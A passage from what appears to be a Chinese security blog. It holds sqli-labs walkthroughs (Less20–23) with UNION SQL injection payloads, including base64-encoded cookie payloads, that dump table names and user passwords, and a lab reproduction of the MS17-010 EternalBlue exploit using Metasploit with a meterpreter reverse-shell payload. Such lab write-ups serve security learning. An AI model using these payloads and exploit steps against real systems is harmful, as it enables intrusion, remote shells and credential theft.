punctuation">;</span>                <span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token string">"&lt;br&gt;"</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token string">'&lt;font color= "#FFFF00" font size = 6 &gt;'</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token string">" Your Cookie is deleted"</span><span class="token punctuation">;</span>                                <span class="token function">setcookie</span><span class="token punctuation">(</span><span class="token string">'uname'</span><span class="token punctuation">,</span> <span class="token variable">$row1</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">3600</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                                <span class="token function">header</span> <span class="token punctuation">(</span><span class="token string">'Location: index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">echo</span> <span class="token string">'&lt;/font&gt;&lt;/center&gt;&lt;/br&gt;'</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="5"><li><strong>暴数据库</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">admin' union select 1,user(),database()#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/22/BTmf82MoitJ1OZl.png" alt="less20-3.png"></p><p><img src="https://i.loli.net/2019/11/22/1qwl7Wp5CFy8EPQ.png" alt="less20-4.png"></p><ol start="6"><li><strong>暴表</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">uname=-admin'  UNION SELECT 1,group_concat(table_name),3 FROM information_schema.TABLES WHERE TABLE_SCHEMA='security'#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/22/HcjaT5Mdi21DxFb.png" alt="less20-5.png"></p><ol start="7"><li><strong>暴字段</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">uname=-admin'  UNION SELECT 1,2,group_concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='security' AND TABLE_NAME='users'#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/22/c2UlL6jOzFTQSg9.png" alt="less20-6.png"></p><ol start="8"><li><strong>暴数据</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">uname=-admin'  UNION SELECT 1,group_concat(username),group_concat(password) FROM security.users#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/22/j9gIqV3KsxT8p6Q.png" alt="less20-7.png"></p><h2 id="Less21"><a href="#Less21" class="headerlink" title="Less21"></a>Less21</h2><p>这一关是 HTTP 头 cookies 注入，本关注入的前提是必须要知道用户名和密码。</p><hr><ol><li><strong>正确登录到界面后，发现 cookie 值有些不同</strong></li></ol><p><img src="https://i.loli.net/2019/11/26/iOVvyM326TElYgn.png" alt="less21-1.png"></p><ol start="2"><li><strong>从输出的字符来看，cookie 是被加密了。</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">YWRtaW4=<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li><strong>看到加密字符串最后有一个 <code>=</code> ,首先想到的是 base64，尝试解密。</strong></li></ol><p><img src="https://i.loli.net/2019/11/26/aQ5Dx7kXYKAdUT3.png" alt="less21-2.png"></p><p><img src="https://i.loli.net/2019/11/26/FcBO3Res1LozYhD.png" alt="less21-3.png"></p><ol start="4"><li><strong>使用 base64 将 payload 加密</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">payload：admin' union select 1,user(),database()#base64：YWRtaW4nIHVuaW9uIHNlbGVjdCAxLHVzZXIoKSxkYXRhYmFzZSgpIw==<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="5"><li><strong>尝试使用 modify headers 修改 cookie 并刷新界面。发现无法成功，界面转到了登录界面</strong></li></ol><p><img src="https://i.loli.net/2019/11/26/UzXhyqkBs48npr9.png" alt="less21-4.png"></p><p><img src="https://i.loli.net/2019/11/26/z6hV2WyMCUbiIGo.png" alt="less21-5.png"></p><ol start="6"><li><strong>使用 burpsuit 抓包，改 cookie 值,并重新转发</strong></li></ol><p><img src="https://i.loli.net/2019/11/26/2ghM7kBrFaKf1cn.png" alt="less21-6.png"></p><p><img src="https://i.loli.net/2019/11/26/LvW18ztCnIRUDp9.png" alt="less21-7.png"></p><ol start="7"><li><strong>从上面发现 sql 语句报错有 ” ‘) “，重新修改 payload。</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">payload：-admin') union select 1,user(),database()#base64：LWFkbWluJykgdW5pb24gc2VsZWN0IDEsdXNlcigpLGRhdGFiYXNlKCkj<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/26/5apk9Igq2uPLErJ.png" alt="less21-8.png"></p><p>注：union 前面的值要为空，第四步忘记改为空值了</p><ol start="8"><li><strong>暴表</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">payload：-admin')  UNION SELECT 1,group_concat(table_name),3 FROM information_schema.TABLES WHERE TABLE_SCHEMA='security'#base64：LWFkbWluJykgIFVOSU9OIFNFTEVDVCAxLGdyb3VwX2NvbmNhdCh0YWJsZV9uYW1lKSwzIEZST00gaW5mb3JtYXRpb25fc2NoZW1hLlRBQkxFUyBXSEVSRSBUQUJMRV9TQ0hFTUE9J3NlY3VyaXR5JyM=<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/26/9w2Y6elNZqD3aWA.png" alt="less21-9.png"></p><ol start="9"><li><strong>暴字段</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">payload：-admin')  UNION SELECT 1,2,group_concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='security' AND TABLE_NAME='users'#base64：LWFkbWluJykgIFVOSU9OIFNFTEVDVCAxLDIsZ3JvdXBfY29uY2F0KGNvbHVtbl9uYW1lKSBGUk9NIGluZm9ybWF0aW9uX3NjaGVtYS5DT0xVTU5TIFdIRVJFIFRBQkxFX1NDSEVNQT0nc2VjdXJpdHknIEFORCBUQUJMRV9OQU1FPSd1c2Vycycj<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/26/b7XWhAfto35BU8m.png" alt="less21-10.png"></p><ol start="10"><li><strong>暴数据</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">payload：-admin')  UNION SELECT 1,group_concat(username),group_concat(password) FROM security.users#base64：LWFkbWluJykgIFVOSU9OIFNFTEVDVCAxLGdyb3VwX2NvbmNhdCh1c2VybmFtZSksZ3JvdXBfY29uY2F0KHBhc3N3b3JkKSBGUk9NIHNlY3VyaXR5LnVzZXJzIw==<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/26/sZ52OUvYQ81Wrtj.png" alt="less21-11.png"></p><h2 id="Less22"><a href="#Less22" class="headerlink" title="Less22"></a>Less22</h2><p>这一关是 HTTP 头 cookies 注入，本关注入的前提是必须要知道用户名和密码。</p><hr><ol><li><strong>暴库</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">payload：-admin" union select 1,user(),database()#base64：LWFkbWluIiB1bmlvbiBzZWxlY3QgMSx1c2VyKCksZGF0YWJhc2UoKSM=<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/26/LHFi5MjPUdWJeSl.png" alt="less22-1.png"></p><ol start="2"><li><strong>暴表</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">payload：-admin"  UNION SELECT 1,group_concat(table_name),3 FROM information_schema.TABLES WHERE TABLE_SCHEMA='security'#base64：LWFkbWluIiAgVU5JT04gU0VMRUNUIDEsZ3JvdXBfY29uY2F0KHRhYmxlX25hbWUpLDMgRlJPTSBpbmZvcm1hdGlvbl9zY2hlbWEuVEFCTEVTIFdIRVJFIFRBQkxFX1NDSEVNQT0nc2VjdXJpdHknIw==<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/26/gQen9pUJYGC3jMm.png" alt="less22-2.png"></p><ol start="3"><li><strong>暴字段</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">payload：-admin"  UNION SELECT 1,2,group_concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='security' AND TABLE_NAME='users'#base64：LWFkbWluIiAgVU5JT04gU0VMRUNUIDEsMixncm91cF9jb25jYXQoY29sdW1uX25hbWUpIEZST00gaW5mb3JtYXRpb25fc2NoZW1hLkNPTFVNTlMgV0hFUkUgVEFCTEVfU0NIRU1BPSdzZWN1cml0eScgQU5EIFRBQkxFX05BTUU9J3VzZXJzJyM=<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/26/RjsG6YMoTxJntWm.png" alt="less22-3.png"></p><ol start="4"><li><strong>暴数据</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">payload：-admin"  UNION SELECT 1,group_concat(username),group_concat(password) FROM security.users#base64：LWFkbWluIiAgVU5JT04gU0VMRUNUIDEsZ3JvdXBfY29uY2F0KHVzZXJuYW1lKSxncm91cF9jb25jYXQocGFzc3dvcmQpIEZST00gc2VjdXJpdHkudXNlcnMj<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2019/11/26/UhRg2alQ7oLrTGA.png" alt="less22-4.png"></p><h2 id="Less23"><a href="#Less23" class="headerlink" title="Less23"></a>Less23</h2><p>GET型基于错误的去除注释的注入</p><ol><li><p><strong>查看源码</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token comment" spellcheck="true">//filter the comments out so as to comments should not work</span><span class="token variable">$reg</span> <span class="token operator">=</span> <span class="token string">"/#/"</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">//匹配 “#” 字符</span><span class="token variable">$reg1</span> <span class="token operator">=</span> <span class="token string">"/--/"</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//匹配 “--” 字符</span><span class="token variable">$replace</span> <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//空值</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$reg</span><span class="token punctuation">,</span> <span class="token variable">$replace</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//将变量 “$id” 中的 “#” 字符，替换为空值</span><span class="token variable">$id</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token variable">$reg1</span><span class="token punctuation">,</span> <span class="token variable">$replace</span><span class="token punctuation">,</span> <span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment" spellcheck="true">//将变量 “$id” 中的 “--” 字符，替换为空值</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p><strong>添加 “单引号” 报错</strong></p></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-23/?id=1'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2020/02/10/ouAJi4TaHQ3N8gE.png" alt="less23-1.png"></p><ol start="3"><li><strong>既然这里无法注释，那就把 “单引号” 闭合掉</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-23/?id=1' or '1'='1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2020/02/10/ut6z3PmaeGFkyEw.png" alt="less23-2.png"></p><ol start="4"><li><strong>获取数据库登录用户、数据库名</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-23/?id=-1'union select 1,user(),database()'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2020/02/10/BYROsNzVa6kGZ8i.png" alt="less23-3.png"></p><ol start="5"><li><strong>暴表</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-23/?id=-1' union select 1,(select group_concat(table_name) FROM information_schema.TABLES WHERE TABLE_SCHEMA='security'),3'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2020/02/10/l7LUR3NiKcrwdmW.png" alt="less23-4.png"></p><ol start="6"><li><strong>爆表中的字段</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-23/?id=-1' union select 1,(select group_concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='security' AND TABLE_NAME='users'),3'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2020/02/10/CFwnLI58kDKuWP7.png" alt="less23-5.png"></p><ol start="7"><li><strong>爆数据</strong></li></ol><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-23/?id=-1' union select 1,(select group_concat(username) FROM security.users),3'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2020/02/10/CRlUzM4c5QLKsrH.png" alt="less23-6.png"></p><pre class="line-numbers language-text"><code class="language-text">http://192.168.150.128/sqli-labs-master/Less-23/?id=-1' union select 1,(select group_concat(password) FROM security.users),3'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>注：这一关还可以使用  extractvalue() 和 UpdateXml() 函数进行报错注入，使用延时注入。</p><p><img src="https://i.loli.net/2020/02/10/hIxtvPBi7kLepMV.png" alt="less23-7.png"></p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><hr><h3 id="Less1-1"><a href="#Less1-1" class="headerlink" title="Less1"></a>Less1</h3><p><a href="https://www.cnblogs.com/omnis/p/8311556.html" target="_blank" rel="noopener">【sqli-labs】 less1 GET - Error based - Single quotes - String(GET型基于错误的单引号字符型注入)</a></p><p><a href="https://blog.csdn.net/sdb5858874/article/details/80656123" target="_blank" rel="noopener">SQL注入——联合查询和报错注入</a></p><p><a href="https://www.jianshu.com/p/5903e8c002ed" target="_blank" rel="noopener">MYSQL中information_schema简介</a></p><p><a href="https://www.cnblogs.com/xuthus/p/9450805.html" target="_blank" rel="noopener">SQL注入 (1) SQL注入类型介绍</a></p><h3 id="Less2-1"><a href="#Less2-1" class="headerlink" title="Less2"></a>Less2</h3><p><a href="https://www.cnblogs.com/omnis/p/8313148.html" target="_blank" rel="noopener">【sqli-labs】 less2 GET - Error based - Intiger based (基于错误的GET整型注入)</a></p><h3 id="Less3-1"><a href="#Less3-1" class="headerlink" title="Less3"></a>Less3</h3><p><a href="https://www.cnblogs.com/omnis/p/8313233.html" target="_blank" rel="noopener">【sqli-labs】 less3 GET - Error based - Single quotes with twist string(基于错误的GET单引号变形字符型注入)</a></p><h3 id="Less4-1"><a href="#Less4-1" class="headerlink" title="Less4"></a>Less4</h3><p><a href="https://www.cnblogs.com/omnis/p/8313314.html" target="_blank" rel="noopener">【sqli-labs】 less4 GET - Error based - Double Quotes - String (基于错误的GET双引号字符型注入)</a></p><h3 id="Less5-1"><a href="#Less5-1" class="headerlink" title="Less5"></a>Less5</h3><p><a href="https://www.cnblogs.com/omnis/p/8313608.html" target="_blank" rel="noopener">【sqli-labs】 less5 GET - Double Injection - Single Quotes - String (双查询注入GET单引号字符型注入)</a></p><p><a href="https://bbs.ichunqiu.com/thread-27209-1-43.html" target="_blank" rel="noopener">Double SQL Injection（双查询注入）</a></p><p><a href="https://www.cnblogs.com/litlife/p/8472323.html" target="_blank" rel="noopener">Floor报错原理分析</a></p><h3 id="Less6-1"><a href="#Less6-1" class="headerlink" title="Less6"></a>Less6</h3><p><a href="https://www.cnblogs.com/omnis/p/8314700.html" target="_blank" rel="noopener">【sqli-labs】 less6 GET - Double Injection - Double Quotes - String (双注入GET双引号字符型注入)</a></p><h3 id="Less7-1"><a href="#Less7-1" class="headerlink" title="Less7"></a>Less7</h3><p><a href="https://www.php.cn/mysql-tutorials-401995.html" target="_blank" rel="noopener">mysql5.7导出数据提示–secure-file-priv选项问题的解决方法</a></p><p><a href="https://blog.csdn.net/baidu_37576427/article/details/76160309" target="_blank" rel="noopener">SQLI labs 第七课（神游太虚）</a></p><p><a href="https://www.cnblogs.com/omnis/p/8315087.html" target="_blank" rel="noopener">【sqli-labs】 less7 GET - Dump into outfile - String (导出文件GET字符型注入)</a></p><h3 id="Less8-1"><a href="#Less8-1" class="headerlink" title="Less8"></a>Less8</h3><p><a href="https://www.cnblogs.com/omnis/p/8318639.html" target="_blank" rel="noopener">【sqli-labs】 less8 GET - Blind - Boolian Based - Single Quotes (基于布尔的单引号GET盲注)</a></p><h3 id="Less9-1"><a href="#Less9-1" class="headerlink" title="Less9"></a>Less9</h3><p><a href="https://www.cnblogs.com/omnis/p/8318743.html" target="_blank" rel="noopener">【sqli-labs】 less9 GET - Blind - Time based. - Single Quotes (基于时间的GET单引号盲注)</a></p><h3 id="Less10-1"><a href="#Less10-1" class="headerlink" title="Less10"></a>Less10</h3><p><a href="https://www.cnblogs.com/omnis/p/8318762.html" target="_blank" rel="noopener">【sqli-labs】 less10 GET - Blind - Time based. - Double quotes (基于时间的双引号盲注)</a></p><h3 id="Less11-1"><a href="#Less11-1" class="headerlink" title="Less11"></a>Less11</h3><p><a href="http://www.cnblogs.com/lcamry/category/846064.html" target="_blank" rel="noopener">mysql注入天书</a></p><p><a href="https://blog.csdn.net/wang1006008051/article/details/78157325" target="_blank" rel="noopener">html中form表单的使用方法和介绍</a></p><p><a href="https://www.jianshu.com/p/694ebe354c28" target="_blank" rel="noopener">HTML form表单</a></p><h3 id="Less17-1"><a href="#Less17-1" class="headerlink" title="Less17"></a>Less17</h3><p><a href="https://www.zhihu.com/question/275933480" target="_blank" rel="noopener">在调用updatexml显错注入的时候为什么要用concat函数？</a></p><p><a href="https://www.cnblogs.com/-zhong/p/10927731.html" target="_blank" rel="noopener">Updatexml函数再mysql中的作用</a></p><p><a href="http://www.blogjava.net/chenpengyi/archive/2006/07/11/57578.html" target="_blank" rel="noopener">MySQL 5.1 提供XML内置支持(XPath)</a></p><h3 id="Less18-1"><a href="#Less18-1" class="headerlink" title="Less18"></a>Less18</h3><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/User-Agent" target="_blank" rel="noopener">User-Agent</a></p><p><a href="https://zh.wikipedia.org/wiki/%E8%B6%85%E6%96%87%E6%9C%AC%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE" target="_blank" rel="noopener">超文本传输协议</a></p><p><a href="https://www.jianshu.com/p/c5cf6a1967d1" target="_blank" rel="noopener">HTTP请求头之User-Agent</a></p><p><a href="https://baike.baidu.com/item/%E6%8E%92%E7%89%88%E5%BC%95%E6%93%8E/8371898?fromtitle=gecko&amp;fromid=7348782" target="_blank" rel="noopener">排版引擎</a></p><p><a href="https://www.bilibili.com/video/av68787122?p=1" target="_blank" rel="noopener">sql注入之sqli-labs系列教程(less18-22)</a></p><h3 id="Less19-1"><a href="#Less19-1" class="headerlink" title="Less19"></a>Less19</h3><p><a href="https://75.team/post/everything-you-could-ever-want-to-know-and-more-about-controlling-the-referer-header-fastmail-blog.html" target="_blank" rel="noopener">关于控制 Referer 你想要知道的一切（和更多的）</a></p><p><a href="https://zhuanlan.zhihu.com/p/33359713" target="_blank" rel="noopener">Referer伪造，防盗链与反盗链，5分钟科普文，含实战源码，收藏！</a></p><p><a href="https://www.ruanyifeng.com/blog/2019/06/http-referer.html" target="_blank" rel="noopener">HTTP Referer 教程</a></p><h3 id="Less20-1"><a href="#Less20-1" class="headerlink" title="Less20"></a>Less20</h3><p><a href="https://zh.wikipedia.org/wiki/Cookie" target="_blank" rel="noopener">Cookie</a></p><p><a href="https://bubkoo.com/2014/04/21/http-cookies-explained/" target="_blank" rel="noopener">HTTP cookies 详解</a></p><p><a href="http://www.itboth.com/d/Vvmmiy/sqli-labs-sql" target="_blank" rel="noopener">通过sqli-labs学习sql注入——基础挑战之less11-22</a></p><h3 id="Less21-1"><a href="#Less21-1" class="headerlink" title="Less21"></a>Less21</h3><p><a href="http://www.pianshen.com/article/4049219913/" target="_blank" rel="noopener">Sqli-Lab | Less 21-23</a></p><p><a href="https://warwolf767.gitbooks.io/sqli-lab/content/less_21_-_less_30.html" target="_blank" rel="noopener">SQLI-LAB 的 实战记录(Less 21 - Less 30)</a></p><h3 id="Less23-1"><a href="#Less23-1" class="headerlink" title="Less23"></a>Less23</h3><p><a href="https://www.cnblogs.com/omnis/p/8361047.html" target="_blank" rel="noopener">【sqli-labs】 less23 Error based - strip comments (GET型基于错误的去除注释的注入)</a></p><p><a href="https://zhzhdoai.github.io/2018/12/22/sqlilabs23-28/" target="_blank" rel="noopener">sqlilabs23-28</a></p><p><a href="https://blog.csdn.net/qq_21500173/article/details/51964908" target="_blank" rel="noopener">Less - 23 Error Based- no comments</a></p><p><a href="https://blog.csdn.net/Fly_hps/article/details/80285353" target="_blank" rel="noopener">sqli-labs————less 23（高级注入篇）</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Web security </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sqli-labs </tag>
            
            <tag> SQL Injection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ms17-010</title>
      <link href="/2020/02/03/ms17-010/"/>
      <url>/2020/02/03/ms17-010/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞复现环境"><a href="#漏洞复现环境" class="headerlink" title="漏洞复现环境"></a>漏洞复现环境</h2><hr><p>靶机：windows 7 SP1（64位）、windows 7 SP1（32位）</p><p>渗透系统：kali linux</p><p>渗透工具：metasploit v5.0.8-dev</p><h3 id="扫描目标是否存在漏洞"><a href="#扫描目标是否存在漏洞" class="headerlink" title="扫描目标是否存在漏洞"></a>扫描目标是否存在漏洞</h3><hr><p><strong>使用模块 auxiliary/scanner/smb/smb_ms17_010 扫描漏洞</strong></p><pre><code>msf5 &gt; use auxiliary/scanner/smb/smb_ms17_010msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; optionsModule options (auxiliary/scanner/smb/smb_ms17_010):   Name         Current Setting                                                 Required  Description   ----         ---------------                                                 --------  -----------   CHECK_ARCH   true                                                            no        Check for architecture on vulnerable hosts   CHECK_DOPU   true                                                            no        Check for DOUBLEPULSAR on vulnerable hosts   CHECK_PIPE   false                                                           no        Check for named pipe on vulnerable hosts   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  yes       List of named pipes to check   RHOSTS                                                                       yes       The target address range or CIDR identifier   RPORT        445                                                             yes       The SMB service port (TCP)   SMBDomain    .                                                               no        The Windows domain to use for authentication   SMBPass                                                                      no        The password for the specified username   SMBUser                                                                      no        The username to authenticate as   THREADS      1                                                               yes       The number of concurrent threadsmsf5 auxiliary(scanner/smb/smb_ms17_010) &gt; set RHOSTS 192.168.19.20RHOSTS =&gt; 192.168.19.20msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; exploit [+] 192.168.19.20:445     - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7601 Service Pack 1 x64 (64-bit)[*] 192.168.19.20:445     - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completed</code></pre><h3 id="64-位利用"><a href="#64-位利用" class="headerlink" title="64 位利用"></a>64 位利用</h3><hr><p><strong>利用攻击模块 exploit/windows/smb/ms17_010_eternalblue 进行渗透</strong></p><pre><code>msf5 auxiliary(scanner/smb/smb_ms17_010) &gt; use exploit/windows/smb/ms17_010_eternalbluemsf5 exploit(windows/smb/ms17_010_eternalblue) &gt; optionsModule options (exploit/windows/smb/ms17_010_eternalblue):   Name           Current Setting  Required  Description   ----           ---------------  --------  -----------   RHOSTS                          yes       The target address range or CIDR identifier   RPORT          445              yes       The target port (TCP)   SMBDomain      .                no        (Optional) The Windows domain to use for authentication   SMBPass                         no        (Optional) The password for the specified username   SMBUser                         no        (Optional) The username to authenticate as   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.Exploit target:   Id  Name   --  ----   0   Windows 7 and Server 2008 R2 (x64) All Service Packsmsf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set RHOSTS 192.168.19.20RHOSTS =&gt; 192.168.19.20msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set payload windows/x64/meterpreter/reverse_tcppayload =&gt; windows/x64/meterpreter/reverse_tcpmsf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set lhost 192.168.19.19 lhost =&gt; 192.168.19.19msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; set lport 222lport =&gt; 222msf5 exploit(windows/smb/ms17_010_eternalblue) &gt; exploit </code></pre><h3 id="32-位利用"><a href="#32-位利用" class="headerlink" title="32 位利用"></a>32 位利用</h3><hr><ol><li><strong>下载 exp</strong></li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># git clone https://github.com/ElevenPaths/Eternalblue-Doublepulsar-Metasploit&amp;&amp;cd Eternalblue-Doublepulsar-Metasploit</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li><strong>修改下载的 eternalblue_doublepulsar.rb</strong></li></ol><ul><li>改路径</li></ul><p>将 /root/Eternalblue-Doublepulsar-Metasploit/deps/改为/usr/share/metasploit-framework/modules/exploits/windows/smb/deps</p><ul><li>改进程名称</li></ul><p>默认进程名称为 wlms.exe，建议修改为 explorer.exe</p><p><img src="https://i.loli.net/2020/01/30/sp17P2fqc4UwGka.png" alt="ms17010-1.png"></p><ol start="3"><li><strong>将文件 eternalblue_doublepulsar.rb 和目录 deps 复制到 /usr/share/metasploit-framework/modules/exploits/windows/smb/ 目录</strong></li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># cp -r deps/ eternalblue_doublepulsar.rb /usr/share/metasploit-framework/modules/exploits/windows/smb</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li><strong>创建 /root/.wine/drive_c/</strong></li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># mkdir -p /root/.wine/drive_c/</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="5"><li><strong>安装 wine</strong></li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># dpkg --add-architecture i386</span><span class="token comment" spellcheck="true"># apt-get update</span><span class="token comment" spellcheck="true"># apt-get install lib32z1 lib32ncurses5</span><span class="token comment" spellcheck="true"># apt-get install wine32</span><span class="token comment" spellcheck="true"># wine cmd.exe</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="6"><li><strong>使用 eternalblue_doublepulsar.rb 模块进行渗透</strong></li></ol><pre class="line-numbers language-bash"><code class="language-bash">msf5 <span class="token operator">&gt;</span> reload_allmsf5 <span class="token operator">&gt;</span> use exploit/windows/smb/eternalblue_doublepulsarmsf5 exploit<span class="token punctuation">(</span>windows/smb/eternalblue_doublepulsar<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token keyword">set</span> RHOSTS 192.168.19.20RHOSTS <span class="token operator">=</span><span class="token operator">&gt;</span> 192.168.19.20msf5 exploit<span class="token punctuation">(</span>windows/smb/eternalblue_doublepulsar<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token keyword">set</span> payload windows/meterpreter/reverse_tcppayload <span class="token operator">=</span><span class="token operator">&gt;</span> windows/x64/meterpreter/reverse_tcpmsf5 exploit<span class="token punctuation">(</span>windows/smb/eternalblue_doublepulsar<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token keyword">set</span> lhost 192.168.19.19 lhost <span class="token operator">=</span><span class="token operator">&gt;</span> 192.168.19.19msf5 exploit<span class="token punctuation">(</span>windows/smb/eternalblue_doublepulsar<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token keyword">set</span> lport 222lport <span class="token operator">=</span><span class="token operator">&gt;</span> 222msf5 exploit<span class="token punctuation">(</span>windows/smb/eternalblue_doublepulsar<span class="token punctuation">)</span> <span class="token operator">&gt;</span> exploit <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="补充说明"><a href="#补充说明" class="headerlink" title="补充说明"></a>补充说明</h3><hr><p><img src="https://i.loli.net/2020/01/30/zOlXiGE9p6aVsjC.png" alt="ms17010-2.png"></p><p>如果运行时存在上面的报错时，请多尝试几遍，排查网络是否有问题。</p><h3 